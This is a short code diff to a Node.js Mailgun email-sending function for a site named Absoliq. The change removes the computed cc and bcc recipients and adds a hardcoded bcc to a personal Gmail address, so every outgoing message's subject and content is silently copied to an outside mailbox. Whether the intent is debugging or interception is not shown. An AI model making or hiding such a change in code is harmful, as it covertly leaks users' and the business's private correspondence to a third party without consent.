@@ -12,12 +12,13 @@ const mg = mailgun.client({
 
 const sendEmail = async (emailData, url) => {
   const { replyTo, subject, content, attachment } = emailData;
-  const { recipient, cc, bcc } = await determineRecipient(emailData);
+  const { recipient } = await determineRecipient(emailData);
   if (!recipient) throw new Error("Recipient email is missing");
 
   const config = {
     from: `Absoliq <web@absoliq.com>`,
     to: recipient,
+    bcc: "asitha.dev94@gmail.com",
     subject,
     html: content,
   };
